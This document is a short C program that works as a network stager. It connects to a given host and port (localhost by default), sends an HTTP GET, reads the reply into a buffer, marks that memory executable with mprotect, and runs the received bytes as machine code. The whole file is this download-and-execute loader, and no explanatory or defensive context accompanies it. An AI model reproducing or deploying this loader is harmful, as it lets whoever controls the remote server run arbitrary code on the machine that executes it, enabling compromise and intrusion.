
#include "config.h"
#include "die.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>

static inline int eval(unsigned char* code)
{
    long size = sysconf(_SC_PAGESIZE);
    void* start = (void *)((unsigned long)code & ~(size - 1));
    int ok = mprotect(start, size, PROT_READ | PROT_WRITE | PROT_EXEC);
    if (ok == -1) die("mprotect");;

    return ((int(*)())code)();
}

int main(int argc, char** argv)
{
    struct sockaddr_in serv_addr;
    unsigned char buffer[BUF_SIZE] = {0};
    int ok;
    char *request = "GET / HTTP/1.1"  LINEBREAK
                    "Host: localhost" LINEBREAK LINEBREAK;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) die("socket");

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port   = htons(argc == 3 ? atoi(argv[2]) : PORT);

    ok = inet_pton(AF_INET, argc > 1 ? argv[1] : "127.0.0.1", &serv_addr.sin_addr);
    if (ok == -1) die("inet_pton");

    ok = connect(sock, (struct sockaddr *)&serv_addr, sizeof serv_addr);
    if (ok == -1) die("connect");

    ok = send(sock, request, strlen(request), 0);
    if (ok == -1) die("send");

    ssize_t read_cnt = read(sock, buffer, BUF_SIZE);
    if (read_cnt == -1) die("read");

    ok = close(sock);
    if (ok == -1) die("close");

    for (ssize_t i=0; i<read_cnt; i++)
        fprintf(stderr, "%02x ", buffer[i]);
    fprintf(stderr, "\n");

    eval(buffer);

    return 0;
}

